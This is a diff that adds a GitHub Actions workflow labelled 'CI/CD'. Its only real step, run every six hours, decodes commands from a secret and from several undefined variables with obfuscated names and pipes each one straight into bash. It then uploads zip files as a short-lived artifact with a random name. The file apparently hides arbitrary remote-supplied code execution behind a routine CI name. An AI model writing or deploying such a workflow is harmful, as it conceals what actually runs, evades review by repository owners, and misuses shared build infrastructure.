@@ -1,0 +1,33 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '51 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          h65: ${{ secrets.h65 }}
+        run: |
+          printf '%s' "$h65" | jq -r .hf02 | /bin/bash
+          printf '%s' "$z51823" | jq -r .k12703 | /bin/bash
+          echo $g95535 | jq -r .p81028 | /bin/bash
+          echo $gauy28 | jq -r .k032 | /bin/bash
+          echo $avha21097 | jq -r .fivln6 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: bdkz1Jwk
+          path: "*.zip"
+          retention-days: 1
